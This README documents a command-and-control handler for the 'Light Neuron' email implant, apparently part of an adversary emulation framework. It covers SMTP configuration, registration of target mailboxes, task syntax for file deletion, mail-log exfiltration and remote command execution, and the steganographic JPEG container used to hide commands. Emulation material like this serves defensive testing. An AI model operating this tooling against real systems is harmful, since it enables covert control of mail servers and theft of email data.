
# Light Neuron Handler

The Light Neuron C2 handler is the server-side counterpart for the Light Neuron implant
and is specifically designed to interact with it over email.

## Components

## Usage

### Configuration

To enable and configure the Light Neuron handler within the control server, edit
the `config/handler_config.yml` from the main C2 server repo. Adjust the Light Neuron entry as needed.

- host: The SMTP server used to send emails.
- port: The SMTP server Port
- mailFrom: The email address that will appear as the sender.
- username: SMTP username
- password: SMTP password
- image_file_path: The path to the unmodified image used as the stego attachment.
- watch_dir_path: The path on the C2 server that is polled for incoming mail attachments
- recipientFilePath: The text file that holds a list of implant emails/sessions
- encryption: [true/false] used to tell the handler to encrypt traffic or use plain text traffic.


Example:
```
lightneuron:
    host: mail.evilcorp.com
    port: 25
    mailFrom: noreply@evilcorp.com
    username: "postfix"
    password: "postfix_secret_password"
    image_file_path: "/home/postfix/image.jpg"
    watch_dir_path: "/home/user/mail/attachments"
    recipientFilePath: "/path/to/target_emails.txt"
    encryption: true
    enabled: true
```

Run the `controlServer` binary as `sudo` and look for success messages in starting up the LightNeuron handler:
```
sudo ./controlServer
```

### Registering Implants
Since the LightNeuron implant doesn't beacon by design, implant session registration is approached different from other handlers. 
To register an implant session with the Lightneuron handler the handler configuration must have a `recipientFilePath` set.
 The recipient/target email addresses saved in the file will be registered with the C2 server when the server starts.


The file is a .txt documents that has a single target email per line.


Valid formatting for a recipientFilePath .txt:
```
email1@validemail.com
email99@corp.local
target00@mail.local
```

### Tasking Implants
To task an implant you need the GUID (in this case, the target email address), the command ID, and the command to execute.


The Implant will accept the following command ID's:
- Command ID 2: This command will task the implant to delete a given file.
- Command ID 3: This command ID is used to exfiltrate the email log file. It can be passed with a 0 or 1 flag. 
  - 0 will exfiltrate the file without deleting.
  - 1 will exfiltrate the file then delete it.
- Command ID 5: This command ID is used to execute a command on the target system. 

File Deletion Example:
```
./evalsC2client --set-task <GUID/EMAIL> '<cmdID> | <Path to File>'
./evalsC2client --set-task target@mail.local '2 | C:\\file.txt'
```

Email Exfiltration Example:
```
./evalsC2client --set-task <GUID/EMAIL> '<cmdID> | <Deletion Flag>'
./evalsC2client --set-task target@mail.local '3 | 0'
./evalsC2client --set-task target@mail.local '3 | 1'
```

Command execution example:
```
./evalsC2client --set-task <GUID/EMAIL> '<cmdID> | <command to execute>'
./evalsC2client --set-task target@mail.local '5 | whoami'
```


## LightNeuron Stegonagraphy
The light neuron implant uses a .jpg file to hide command and resulting output data inside. The data is stored at a particulate byte offset inside a "container". The container is a specified length of bytes prepended with the length so that the correct information can be read.

Container Layout:
```
@ xx byte offset [Container Size][Container]
```

The recieving end will read the container size and create variable to hold the container data. 
Fianlly, the recieving end will read the number of bytes contained in the container size resulting in clean output/command data.

This stegonagraphy process is bidirectional.

On the C2 side, to reduce bloat logged by the C2 server, if the output is above 1000 bytes then the entire output is written to a file. This allows for simple commands/output (eg. `whoami`, `ipconfig`) to output to the C2 log, but file exfiltration and large command output will go into specific files.

### Testing

### References

This handler uses an external email library to create and send emails over smtp using Postfix
https://github.com/xhit/go-simple-mail/v2
